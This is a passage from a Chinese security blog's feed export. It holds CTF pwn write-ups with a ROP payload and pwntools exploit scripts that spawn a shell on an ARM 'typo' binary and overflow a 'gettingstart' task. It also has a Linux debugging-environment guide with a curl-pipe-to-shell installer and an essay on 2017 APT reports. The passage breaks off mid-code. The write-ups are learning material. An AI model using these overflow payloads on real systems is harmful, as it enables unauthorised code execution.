class="token punctuation">(</span>0x8000<span class="token punctuation">)</span></code></pre><blockquote><p>顺便学习一下几种防护措施的意思：</p><p> 参考链接：<a href="https://www.jianshu.com/p/6e528b33e37a" target="_blank" rel="noopener">https://www.jianshu.com/p/6e528b33e37a</a></p><p> ​    <strong>RELRO</strong>:在Linux系统安全领域数据可以写的存储区就会是攻击的目标，尤其是存储函数指针的区域，尽量减少可写的存储区域可使安全系数提高。GCC, GNU linker以及Glibc-dynamic linker一起配合实现了一种叫做relro的技术Relocation Read Only, 重定向只读，实现就是由linker指定binary的一块经过dynamic linker处理过 relocation之后的区域为只读。</p><p> ​    栈溢出检查，用<strong>Canary金丝雀值</strong>是否变化来检测,Canary found表示开启。金丝雀最早指的是矿工曾利用金丝雀来确认是否有气体泄漏，如果金丝雀因为气体泄漏而中毒死亡，可以给矿工预警。这里是一种缓冲区溢出攻击缓解手段：启用栈保护后，函数开始执行的时候会先往栈里插入cookie信息，当函数真正返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将cookie信息给覆盖掉，导致栈保护检查失败而阻止shellcode的执行。在Linux将cookie信息称为Canary。</p><p> <strong> NX </strong> : No Execute，栈不可执行，也就是windows上的DEP。 分析缓冲区溢出攻击，其根源在于现代计算机对数据和代码没有明确区分这一先天缺陷，就目前来看重新去设计计算机体系结构基本上是不可能的，我们只能靠向前兼容的修补来减少溢出带来的损害，DEP就是用来弥补计算机对数据和代码混淆这一天然缺陷的。 </p><p> <strong>PIE</strong>: position-independent executables, 位置无关的可执行文件，也就是常说的ASLR(Address space layout randomization) 地址随机化，程序每次启动基址都随机。 </p></blockquote></blockquote><h3 id="二-分析程序"><a href="#二-分析程序" class="headerlink" title="二. 分析程序"></a>二. 分析程序</h3><blockquote><p>开始远程调试：</p><p><img src="https://i.loli.net/2018/10/15/5bc4403f1bdbb.png" alt=""></p><p>另一边使用 <code>gdb-multiarch typo -q</code>进入pwndbg，并且使用<code>target remote localhost:6788</code>连接程序：</p><p><img src="https://i.loli.net/2018/10/15/5bc4437a3ebb6.png" alt=""></p><p>生成padding，输入后得到溢出信息</p><pre class=" language-bash"><code class="language-bash">pwndbg<span class="token operator">></span> cyclic 200aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab</code></pre><p><img src="https://i.loli.net/2018/10/15/5bc4443368612.png" alt=""></p></blockquote><h3 id="三-确定溢出点"><a href="#三-确定溢出点" class="headerlink" title="三.确定溢出点"></a>三.确定溢出点</h3><blockquote><p>之前已经说过PC相当于EIP,RIP之类的指向下一条指令的寄存器，那么可以计算padding到PC寄存器的偏移量进而确定溢出点为0x62616165：</p><p>使用pwndbg的<code>cyclic -l</code>命令可以通过地址，字符串确定偏移量.</p><p><img src="https://i.loli.net/2018/10/15/5bc445613c9bc.png" alt=""></p></blockquote><h3 id="四-构造payload进行利用"><a href="#四-构造payload进行利用" class="headerlink" title="四.构造payload进行利用"></a>四.构造payload进行利用</h3><blockquote><p> 默默标记M4x博文中的这句话<code>因为是静态链接, 所以 binary 中一定会有 system 函数 和 /bin/sh 字符串, 如果能找到溢出点, 很容易就能用 rop 来解决了</code>，学习一波姿势，构造<code>rop chain</code>，通过ROPgadget可以找到我们需要的：可以用来传递 返回值的寄存器 r0</p><p><img src="https://i.loli.net/2018/10/15/5bc4465b7fefb.png" alt=""></p><p>那么接下来就是寻找system函数的地址，将其填入PC寄存器的位置，从而执行<code>system(&#39;/bin/sh&#39;)</code></p><p>IDA调试一波：</p><p>通过字符串查找或者交叉引用可以发现函数<code>sub_10BA8</code></p><p><img src="https://i.loli.net/2018/10/15/5bc44948ebb68.png" alt=""></p><p>不知道是不是ida7.0的原因，这里直接找到了system函数：</p><p><img src="https://i.loli.net/2018/10/15/5bc44a0873387.png" alt=""></p><p>可以看到其执行命令的逻辑和地址：</p><p><img src="https://i.loli.net/2018/10/15/5bc44d1ac5d50.png" alt=""></p><p>接下来可以开始构造payload结构：</p><pre class=" language-bash"><code class="language-bash"><span class="token operator">|</span>    padding            <span class="token operator">|</span>    <span class="token operator">&lt;&lt;</span> 112*<span class="token string">'a'</span><span class="token operator">|</span>    pop <span class="token punctuation">{</span>r0,r4,pc<span class="token punctuation">}</span>    <span class="token operator">|</span>    <span class="token operator">&lt;&lt;</span> p32<span class="token punctuation">(</span>0x20904<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#gadget_addr</span><span class="token operator">|</span>    /bin/sh            <span class="token operator">|</span>    <span class="token operator">&lt;&lt;</span> p32<span class="token punctuation">(</span>0x6c384<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#/bin/sh_addr</span><span class="token operator">|</span>    junk_data<span class="token punctuation">(</span>r4<span class="token punctuation">)</span>    <span class="token operator">|</span>    <span class="token operator">&lt;&lt;</span> p32<span class="token punctuation">(</span><span class="token string">"anything"</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#r4填充</span><span class="token operator">|</span>    system_addr<span class="token punctuation">(</span>pc<span class="token punctuation">)</span>    <span class="token operator">|</span>    <span class="token operator">&lt;&lt;</span> p32<span class="token punctuation">(</span>0x110b4<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#system函数地址</span></code></pre><p><strong>溢出导致PC指向gadget_addr，然后执行命令pop出栈将”/bin/sh”赋值到r0寄存器，junk_data赋值到r4寄存器，system_addr赋值到PC寄存器。</strong></p></blockquote><h3 id="五-攻破"><a href="#五-攻破" class="headerlink" title="五.攻破"></a>五.攻破</h3><blockquote><p>写出exp:    </p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding:utf-8</span>__Auther__ <span class="token operator">=</span> <span class="token string">"Yof3ng"</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./typo"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"quit\n"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">112</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x20904</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x6c384</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x110b4</span><span class="token punctuation">)</span><span class="token keyword">try</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"echo xiaoyifeng"</span><span class="token punctuation">)</span><span class="token keyword">except</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Error!"</span><span class="token punctuation">)</span>    exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token keyword">if</span><span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"xiaoyifeng"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"getshell"</span><span class="token punctuation">)</span></code></pre><p><img src="https://i.loli.net/2018/10/15/5bc4518d2ce65.png" alt=""></p></blockquote><blockquote><p>PWN真好玩！😭😭</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
            <tag> CTF </tag>
            
            <tag> 二进制安全 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Linux环境配置</title>
      <link href="/2018/10/14/Linux%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"/>
      <url>/2018/10/14/Linux%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h1 id="Linux环境配置"><a href="#Linux环境配置" class="headerlink" title="Linux环境配置"></a>Linux环境配置</h1><blockquote><p>​    作为一个信安学习者，和环境打交道是经常的事，那么接下来为二进制学习开始做准备，配置各种架构的调试环境，提高效率。</p></blockquote><h2 id="oh-my-zsh"><a href="#oh-my-zsh" class="headerlink" title="oh-my-zsh"></a>oh-my-zsh</h2><blockquote><p>​    zsh是一个很强大的linux终端shell工具，而oh-my-zsh是一个高效率的配置工具，通过oh-my-zsh可以很快地配置zsh，那么如何进行完整地安装呢：</p><blockquote><p>首先需要安装python的pip，然后安装zsh，再通过<code>sh -c&quot;$(curl -fsSL https://raw.github.com/robbyrussell/oh-my-zsh/master/tools/install.sh)&quot;</code>命令来安装oh-my-zsh。</p><p>通过修改<code>~/.zshrc</code>里的参数，如主题<code>ZSH_THEME=&quot;random&quot;</code>来设置终端的样式。</p><p>配置zsh语法高亮，<code>git clone https://github.com/zsh-users/zsh-syntax-highlighting.git ${ZSH_CUSTOM:-~/.oh-my-zsh/custom}/plugins/zsh-syntax-highlighting</code>通过此命令下载插件，并按下图添加参数<code>zsh-syntax-highlighting</code>。</p><p><img src="https://i.loli.net/2018/10/14/5bc346022c416.png" alt=""></p><p>代码自动补插件下载 <code>git clone https://github.com/zsh-users/zsh-autosuggestions</code> 并放在<code>~/.oh-my-zsh/custom/plugins</code>目录下面，然后像上面一样添加参数即可</p></blockquote></blockquote><h2 id="pwn环境配置"><a href="#pwn环境配置" class="headerlink" title="pwn环境配置"></a>pwn环境配置</h2><blockquote><p>参照m4x大佬的博客<a href="https://m4x.fun/post/how-2-pwn-an-arm-binary/" target="_blank" rel="noopener">https://m4x.fun/post/how-2-pwn-an-arm-binary/</a></p><ul><li>安装 git，gdb 和 gdb-multiarch，同时安装 binfmt*用来识别文件类型</li></ul><pre class=" language-bash"><code class="language-bash">$ <span class="token function">sudo</span> <span class="token function">apt-get</span> update$ <span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> <span class="token function">git</span> gdb gdb-multiarch$ <span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> <span class="token string">"binfmt*"</span></code></pre><ul><li>安装 gdb 的插件 pwndbg（或者 gef 等支持多架构的插件），需要pip，pip3等模块</li></ul><pre><code>$ git clone https://github.com/pwndbg/pwndbg$ cd pwndbg</code></pre><ul><li>因为我用的是deepin安装的pwndbg（这是个坑点），所以需要对setup.sh稍作修改，如下：</li></ul><pre class=" language-bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span><span class="token keyword">set</span> -ex<span class="token comment" spellcheck="true"># Helper functions</span>linux<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">uname</span> <span class="token operator">|</span> <span class="token function">grep</span> -i Linux <span class="token operator">&amp;</span><span class="token operator">></span>/dev/null<span class="token punctuation">}</span>osx<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">uname</span> <span class="token operator">|</span> <span class="token function">grep</span> -i Darwin <span class="token operator">&amp;</span><span class="token operator">></span>/dev/null<span class="token punctuation">}</span>PYTHON<span class="token operator">=</span><span class="token string">''</span>INSTALLFLAGS<span class="token operator">=</span><span class="token string">''</span><span class="token keyword">if</span> osx <span class="token operator">||</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$1</span>"</span> <span class="token operator">==</span> <span class="token string">"--user"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>    INSTALLFLAGS<span class="token operator">=</span><span class="token string">"--user"</span><span class="token keyword">else</span>    PYTHON<span class="token operator">=</span><span class="token string">"sudo "</span><span class="token keyword">fi</span><span class="token keyword">if</span> <span class="token operator">!</span> <span class="token function">hash</span> gdb<span class="token punctuation">;</span> <span class="token keyword">then</span>    <span class="token keyword">echo</span> <span class="token string">'Could not find gdb in <span class="token variable">$PATH</span>'</span>    <span class="token keyword">exit</span><span class="token keyword">fi</span><span class="token comment" spellcheck="true"># Update all submodules</span><span class="token comment" spellcheck="true">#git submodule update --init --recursive</span><span class="token comment" spellcheck="true"># Find the Python version used by GDB.</span>PYVER<span class="token operator">=</span><span class="token punctuation">$(</span>gdb -batch -q --nx -ex <span class="token string">'pi import platform; print(".".join(platform.python_version_tuple()[:2]))'</span><span class="token punctuation">)</span>PYTHON+<span class="token operator">=</span><span class="token punctuation">$(</span>gdb -batch -q --nx -ex <span class="token string">'pi import sys; print(sys.executable)'</span><span class="token punctuation">)</span>PYTHON+<span class="token operator">=</span><span class="token string">"<span class="token variable">${PYVER}</span>"</span><span class="token comment" spellcheck="true"># Find the Python site-packages that we need to use so that</span><span class="token comment" spellcheck="true"># GDB can find the files once we've installed them.</span><span class="token keyword">if</span> linux <span class="token operator">&amp;&amp;</span> <span class="token punctuation">[</span> -z <span class="token string">"<span class="token variable">$INSTALLFLAGS</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>    SITE_PACKAGES<span class="token operator">=</span><span class="token punctuation">$(</span>gdb -batch -q --nx -ex <span class="token string">'pi import site; print(site.getsitepackages()[0])'</span><span class="token punctuation">)</span>    INSTALLFLAGS<span class="token operator">=</span><span class="token string">"--target <span class="token variable">${SITE_PACKAGES}</span>"</span><span class="token keyword">fi</span><span class="token comment" spellcheck="true"># Make sure that pip is available</span><span class="token keyword">if</span> <span class="token operator">!</span> <span class="token variable">${PYTHON}</span> -m pip -V<span class="token punctuation">;</span> <span class="token keyword">then</span>    <span class="token variable">${PYTHON}</span> -m ensurepip <span class="token variable">${INSTALLFLAGS}</span> --upgrade<span class="token keyword">fi</span><span class="token comment" spellcheck="true"># Upgrade pip itself</span><span class="token variable">${PYTHON}</span> -m pip <span class="token function">install</span> <span class="token variable">${INSTALLFLAGS}</span> --upgrade pip<span class="token comment" spellcheck="true"># Install Python dependencies</span><span class="token variable">${PYTHON}</span> -m pip <span class="token function">install</span> <span class="token variable">${INSTALLFLAGS}</span> -Ur requirements.txt<span class="token comment" spellcheck="true"># Load Pwndbg into GDB on every launch.</span><span class="token keyword">if</span> <span class="token operator">!</span> <span class="token function">grep</span> pwndbg ~/.gdbinit <span class="token operator">&amp;</span><span class="token operator">></span>/dev/null<span class="token punctuation">;</span> <span class="token keyword">then</span>    <span class="token keyword">echo</span> <span class="token string">"source <span class="token variable">$PWD</span>/gdbinit.py"</span> <span class="token operator">>></span> ~/.gdbinit<span class="token keyword">fi</span></code></pre><pre class=" language-bash"><code class="language-bash">$ ./setup.sh</code></pre><ul><li>安装qemu模拟环境</li></ul><pre class=" language-bash"><code class="language-bash">$ <span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> qemu-user</code></pre></blockquote><blockquote><p>通过 qemu 模拟 arm/mips 环境，进而进行调试 ，</p><p><img src="https://i.loli.net/2018/10/14/5bc34c058efc2.png" alt=""></p><p>运行动态的binary 需要我们查询对应架构的共享库：</p><p><code>apt-cache search &quot;libc6&quot; | grep ARCH</code> </p><p>动态链接的 bianry 需要用对应的 qemu 同时指定共享库路径，例如：</p><p><code>qemu-mipsel -L /usr/mipselbalalbala/  ./add</code></p><blockquote><p>mips（大端）和mipsel（小端）有什么区别呢，在于存储方式，一个是大端（低序存在高地址，按顺序来），一个是小端序（将低序的存在低地址，反常识来）。形象地说：大端是从上往下掉，小端是从下往上飞。</p></blockquote><p>我们只需安装类似 <strong>libc6-ARCH-cross</strong> 形式的即可 ,静态链接的 binary 直接运行即可，会自动调用对应架构的 qemu；</p><p>调试可以使用 qemu 的 -g 指定端口</p><pre class=" language-bash"><code class="language-bash">$ qemu-mipsel -g 1234 -L /usr/mipsel-linux-gnu/ ./add</code></pre><p><img src="https://i.loli.net/2018/10/14/5bc359ad27655.png" alt=""></p><p>然后使用<code>gdb-multiarch</code>进行调试，先指定架构，然后使用remote功能 </p><pre class=" language-bash"><code class="language-bash">pwndbg<span class="token operator">></span> <span class="token keyword">set</span> architecture mips <span class="token punctuation">(</span>但大多数情况下这一步可以省略, 似乎 pwndbg 能自动识别架构<span class="token punctuation">)</span>pwndbg<span class="token operator">></span> target remote localhost:1234<span class="token comment" spellcheck="true">#peda应该问题不大</span></code></pre></blockquote><blockquote><p>下载共享库存在<code>/usr/</code>目录：</p><p><img src="https://i.loli.net/2018/10/14/5bc3583d78da3.png" alt=""></p></blockquote><h2 id="开始使用pwndbg调试"><a href="#开始使用pwndbg调试" class="headerlink" title="开始使用pwndbg调试"></a>开始使用pwndbg调试</h2><blockquote><p> pwndbg正常启动（开心😄）：<img src="https://i.loli.net/2018/10/14/5bc363e61dd11.png" alt=""></p><p>设置好动态调试端口，选择好共享库：</p><p><img src="https://i.loli.net/2018/10/14/5bc364862d2ce.png" alt=""></p><p>然后用<code>gdb-multiarch</code> -q启动 pwndbg，设置好文件架构，连接端口，开始动态调试：<br><img src="https://i.loli.net/2018/10/14/5bc364ebc9a23.png" alt=""></p></blockquote><blockquote><p>​    对于静态编译的 bianry， 可以使用 lscan, flirt, rizzo, bindiff 等多种方法恢复部分符号表</p><p>加油学习吧！</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 环境配置 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Pwn环境配置 </tag>
            
            <tag> qemu </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>2017APT报告研读</title>
      <link href="/2018/10/14/2017APT%E6%8A%A5%E5%91%8A%E7%A0%94%E8%AF%BB/"/>
      <url>/2018/10/14/2017APT%E6%8A%A5%E5%91%8A%E7%A0%94%E8%AF%BB/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h1 id="2017-APT-报告研读"><a href="#2017-APT-报告研读" class="headerlink" title="2017 APT 报告研读"></a>2017 APT 报告研读</h1><h2 id="APT-与网络战争中的大国博弈"><a href="#APT-与网络战争中的大国博弈" class="headerlink" title="APT 与网络战争中的大国博弈"></a>APT 与网络战争中的大国博弈</h2><blockquote><p>&nbsp; &nbsp; &nbsp; &nbsp; 为什么对APT方面的研究让美国，让中国，让世界各国开始重视起来？据数据，2017年遭受APT攻击最多的国家依次是：美国，中国，沙特，韩国、以色列、土耳其、日本、法国、俄罗斯、德国、西班牙、巴基斯坦和英国。以上这些国家，要么是经济地位领先，要么是拥有大量的能源财富，要么就是社会环境不和平，那么这一系列的因素，都成为了APT攻击的起因。</p><p>&nbsp; &nbsp; &nbsp; &nbsp; 而最受APT组织关注的领域或机构类型依次为：政府、能源、 金融、国防、互联网、航空航天、媒体、电信、医疗、化工。正如前不久发生，现在仍在白热化阶段的中美贸易战，为了国家利益而发起的贸易战争；又如朝鲜当前不稳定的社会地位，国家局势，与韩国的争端。再比如说，中东，西亚地区频繁发起的武装冲突。这一切说到的都是现实生活中的局势，但在网络世界中也一样，为了为本国取得一定的优势，网络空间中的APT组织及其活动，则与现实中的大国博弈之间呈现出很多微妙的显性联系。</p><p>&nbsp; &nbsp; &nbsp; &nbsp; 既然APT攻击很明显是与国家之间博弈有联系的，这也就能解释为什么指责他国的APT活动成为了重要的外交手段了。</p></blockquote><h2 id="我国对APT的研究应再进一步"><a href="#我国对APT的研究应再进一步" class="headerlink" title="我国对APT的研究应再进一步"></a>我国对APT的研究应再进一步</h2><blockquote><p>&nbsp; &nbsp; &nbsp; &nbsp; <strong>当今世界，在APT研究领域遥遥领先的是美国，正如各方面美国都处于霸主地位一样，APT研究也不屈居人后</strong>。而中国虽然排在第二名，但只有四个机构发布多篇APT相关研究报告，相比美国的24个机构，美国足足比我们多了六倍，可想而知，其中的各国对APT研究的重视程度也相差甚远。</p><p>&nbsp; &nbsp; &nbsp; &nbsp; <strong>中国已经成为了最大的APT攻击受害者</strong>，很多国家面对中国的发展怀着不同的心思，有的想遏制，有的想帮扶，而想遏制的这些个国家就不停的在各方面费尽心思来对中国进行攻击。统计显示，2017年全年，这些APT组织发动的攻击行动，至少影响了中国境内超过万台电脑，攻击范围遍布国内31个省级行政区。</p><p>&nbsp; &nbsp; &nbsp; &nbsp; 在网络空间安全方面，各国几乎都是同样的起点，但却发展成了不同的水平，当前美国领先的可不仅仅是APT攻击方面，而是整个网络安全方面，所以一旦美国发起网络攻击，可以说大多数国家都是没有什么抵抗之力的。<strong>别的国家咱不管，中国，就不应该屈居人下，实现中国复兴，在各方面都应该抓紧，而网络安全，互联网安全正是不可忽视的一点。</strong></p><p>&nbsp; &nbsp; &nbsp; &nbsp; 根据报告我们也可以看出一个非常具有代表性的事实，不仅仅是APT攻击方面，拓展一下，各方面的研究人才，我们相比美国而言都是有劣势的，是大是小则不细说。是当前国情限制的吗？为什么美国就那么多研究型人才呢？就从当前大部分学生毕业等同于失业的现象来说，可能问题就出现在教育体制以及价值取向了。</p><p>&nbsp; &nbsp; &nbsp; &nbsp; <strong>那么回到主题，我认为我国对APT攻击的研究乃至整个网络空间安全技术的研究应该加紧步伐，加强网络防御建设，培养网络攻防人才，这样才能不落人后。</strong></p></blockquote><h2 id="网络军火民用化让网络战争逐渐出现在公众眼前"><a href="#网络军火民用化让网络战争逐渐出现在公众眼前" class="headerlink" title="网络军火民用化让网络战争逐渐出现在公众眼前"></a>网络军火民用化让网络战争逐渐出现在公众眼前</h2><blockquote><p>&nbsp; &nbsp; &nbsp; &nbsp; <strong>什么是网络军火？</strong>网络军火是一种网络武器，即军火级的网络漏洞利用工具。就像去年永恒之蓝勒索蠕虫病毒（WannaCry）肆虐全球，导致150多个国家，30多万受害者遭遇勒索软件 攻击，医疗、交通、能源、教育等行业领域遭受巨大损失。WannaCry据称是美国国家安全局（NSA）旗下方程式组织（Equation Group）所开发的网络武器，是一款典型的网络军火。</p><p>&nbsp; &nbsp; &nbsp; &nbsp; <strong>我认为网络军火需要严格把控，否则后果不堪想象。</strong> 网络军火大多由一个或者多个高精尖技术团队研发而成，而当前网络空间安全法律制度薄弱，不像现实生活中，限制枪械军火，有严格的法律来保障权益。正是如此，网络空间也就成为了许许多多龌龊苟且，黑暗邪恶事物的藏身之地。而当今各国的网络空间基本上是有防火墙相互隔绝的，也就是说，网络空间也有国界之分，那么自然而然，网络战争这种低成本高效益且隐匿的攻击方式理所当然地就上升到了国家层面。一旦网络军火民用化程度越来越高，而且网络军火的自动化程度也在变高，那么各种APT组织也就会变得更加强大，不仅仅是APT组织，很难想象几乎每个人都会用网络军火来进行攻击，而网络空间已经变成战火之地的场景。</p><p>&nbsp; &nbsp; &nbsp; &nbsp; 网络军火严格把控的同时要发展自己的力量。据报告了解到，美国政府十分重视网络军火的研发，以及利用，拥有属于自己的网络军火库，一个是NSA旗下的方程式组织，另一个据称是美国中情局（CIA）直属的网络情报中心。根据新华社报道，截止2016 年底，CIA直属的网络情报中心拥有超过5000名员工，总共设计了超过1000个木马、病毒和其他“武器化恶意代码”。 而2017年，从特朗普政府大幅提高军事预算的政策倾向看，CIA从事网络武器库开发人员数量会大幅增加。 而上述的这些，都是美国的网络军火力量。试问，如果美国的网络军火我们都扛不住，如何去抵抗现实生活中的战争？这不是未战先垮吗？</p><p>&nbsp; &nbsp; &nbsp; &nbsp; 总之，网络军火级工具和普通的恶意软件、渗透工具等结合后，让很多 攻击行为同时具备高级攻击手段和一般手段的特性，增加了犯罪分子的隐蔽性，也会干扰监测识别高级威胁。 <strong>所以，某种程度上，网络军火民用化抬升了安全研究者的门槛，增加了APT的防控难度，网络安全企业任重道远。我国在研究如何抵抗这种网络军火攻击的同时，也应该也加大网络军火的研发力度，一味的防守只会让自己处于被动的状态，只有自己也拥有能够威胁到敌方的力量，才能护我国和平发展之路。</strong></p></blockquote><hr><blockquote><p> 以上仅属个人观点，若有不符，还望斧正。</p></blockquote><p>参考：</p><p><a href="https://ti.360.net/blog/articles/apt-report-of-2017/" target="_blank" rel="noopener">2017中国高级持续性威胁（APT）研究报告 </a></p><p><a href="http://cpc.people.com.cn/xuexi/n1/2018/0817/c385476-30234135.html" target="_blank" rel="noopener">习近平谈网络安全：没有网络安全就没有国家安全</a></p><p><a href="https://www.doit.com.cn/p/251027.html" target="_blank" rel="noopener">肖新光：APT的本质是大国博弈，我们生与斯，长与斯，不义之财我们分文不取，祖宗之地我们寸土不让</a></p>]]></content>
      
      
      <categories>
          
          <category> 杂文 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> APT </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Pwn-10月14-护网杯</title>
      <link href="/2018/10/13/Pwn-10%E6%9C%8814-%E6%8A%A4%E7%BD%91%E6%9D%AF/"/>
      <url>/2018/10/13/Pwn-10%E6%9C%8814-%E6%8A%A4%E7%BD%91%E6%9D%AF/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h1 id="Pwn-10-13"><a href="#Pwn-10-13" class="headerlink" title="Pwn-10/13"></a>Pwn-10/13</h1><blockquote><p>​    今天打了护网杯，从之前的强网杯，到国赛，到铁三，到Xman，再到网鼎杯，最后到了今天的护网杯，经历的比赛倒是挺多，只是进步微乎其微，实在汗颜，希望接下来能有较大的进步！</p><p>​    write-up友链：<a href="https://supery4ng.github.io/2018/10/14/%E6%8A%A4%E7%BD%91%E6%9D%AFWP/" target="_blank" rel="noopener">https://supery4ng.github.io/2018/10/14/%E6%8A%A4%E7%BD%91%E6%9D%AFWP/</a></p><p>​    护网杯关键词：<code>python tornado模板注入(STTI)</code>,<code>条件竞争</code>,<code>辣条</code>,<code>溢出</code>,<code>自闭</code></p></blockquote><h2 id="gettingstart"><a href="#gettingstart" class="headerlink" title="gettingstart"></a>gettingstart</h2><blockquote><p>​    这相当于今天pwn的签到题，简单但详细地复原一下：</p><p>​    第一步，IDA看一看，逻辑十分简单，甚至可以直接写payload：</p><p><img src="https://i.loli.net/2018/10/13/5bc20e49c32cb.png" alt=""></p><p>​    突破点是通过read函数，在buf处进行溢出，进而覆盖v7，v8的值，达到else的条件，即v7==0x7FFFFFFFFFFFFFFF,v8==0.1。</p><p>​    这里我们需要知道的是，浮点数在内存中表现的形式是什么样子的，它与普通的整型不同，会做出转换，比较晦涩。这里简单写一个C语言程序看看0.1是怎么表示的：</p><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">double</span> a<span class="token operator">=</span><span class="token number">0.1</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%lf"</span><span class="token punctuation">,</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>​    通过<code>gcc -o test test.c -z noexecstack -no-pie</code>进行编译，然后使用gdb看看：</p><p><img src="https://i.loli.net/2018/10/13/5bc213eed9cfc.png" alt=""></p><p>​    显而易见，0.1是用0x3fb999999999999a表示的，那么在接下来的exp中就应该这样写:</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>p<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">"./task"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#p=remote("117.78.26.114",31498)</span>payload<span class="token operator">=</span><span class="token string">""</span>payload<span class="token operator">+=</span><span class="token string">"A"</span><span class="token operator">*</span><span class="token number">24</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x7FFFFFFFFFFFFFFF</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x3FB999999999999A</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#cmd="cat flag"</span><span class="token comment" spellcheck="true">#print p.recv()</span><span class="token comment" spellcheck="true">#print payload</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token keyword">print</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#p.send(cmd)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#print p.recv()</span></code></pre><p>运行exp，效果图：</p><p><img src="https://i.loli.net/2018/10/13/5bc214f6668a4.png" alt=""></p></blockquote><h2 id="验证数组越界"><a href="#验证数组越界" class="headerlink" title="验证数组越界"></a>验证数组越界</h2><blockquote><p>​    写一段简单的代码来验证一下，新生经常会犯错的数组越界问题</p><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">int</span> a<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        a<span class="token punctuation">[</span><span class="token 